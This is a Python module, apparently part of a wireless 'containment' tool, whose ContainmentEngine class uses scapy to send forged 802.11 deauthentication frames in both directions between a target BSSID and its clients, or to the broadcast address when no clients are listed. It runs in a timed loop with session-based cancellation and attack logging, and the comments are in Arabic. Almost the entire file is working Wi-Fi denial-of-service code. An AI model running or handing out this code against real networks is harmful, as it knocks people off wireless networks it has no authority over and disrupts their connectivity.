import time
import config
from config import DEAUTH_COUNT, DEAUTH_INTERVAL
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from runtime_state import client_kicked, log_attack, update_status

class ContainmentEngine:
    def __init__(self, iface=None, ack_callback=None):
        self.iface = iface or config.get_interface()
        self.ack_callback = ack_callback  
        self.current_target = None
        self.attack_session = 0  # <--- التريكة الجديدة هنا (رقم العملية)

    def emit_to_frontend(self, bssid, status):
        if self.ack_callback:
            self.ack_callback(status, bssid, f"Containment {status}")

    def contain(self, bssid, clients, channel):
        if channel is None:
            update_status(message="Containment skipped: unknown channel")
            return

        # عمل ID فريد للهجوم ده بالذات (مبني على الوقت بالمللي ثانية)
        my_session = time.time()

        # لو فيه أي هجوم شغال حالياً (حتى لو لنفس الراوتر)، نلغيه في الداشبورد الأول
        if self.current_target is not None:
            self.emit_to_frontend(self.current_target, 'aborted')

        # تحديث بيانات السيستم بالهجوم الجديد والسيشن الجديدة
        self.current_target = bssid
        self.attack_session = my_session

        update_status(message=f"Containment locked on channel {channel}")
        config.LOCKED_CHANNEL = channel
        time.sleep(1)

        attack_duration = 5
        start_time = time.time()
        log_attack(f"Containment started -> {bssid}", bssid)

        while time.time() - start_time < attack_duration:
            # لو السيشن اتغيرت (سواء شبكة تانية أو دبل كليك على نفس الشبكة)، فرمل فوراً!
            if self.attack_session != my_session:
                return

            if clients:
                for client in clients:
                    if self.attack_session != my_session:
                        return 
                    self.deauth_pair(bssid, client, my_session)
                    client_kicked()
            else:
                self.deauth_pair(bssid, "ff:ff:ff:ff:ff:ff", my_session)

        # الفلتر النهائي: لو الهجوم خلص ومحدش قطعه بسيشن جديدة
        if self.attack_session == my_session:
            config.LOCKED_CHANNEL = None
            self.current_target = None
            log_attack(f"Containment finished -> {bssid}", bssid)
            update_status(message="Containment finished")
            self.emit_to_frontend(bssid, 'executed')

    def deauth_pair(self, bssid, client, my_session):
        pkt1 = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        pkt2 = RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
        
        for _ in range(DEAUTH_COUNT):
            # فرملة طوارئ جوه اللوب لو الهجوم اتلغى
            if self.attack_session != my_session:
                log_attack(f"Deauth forcefully stopped for {bssid} -> {client}", bssid)
                return # خروج فوري من الدالة كلها
            
            sendp(pkt1, iface=self.iface, verbose=False)
            sendp(pkt2, iface=self.iface, verbose=False)
            time.sleep(DEAUTH_INTERVAL)
            
        log_attack(f"Deauth cycle sent {bssid} -> {client}", bssid)
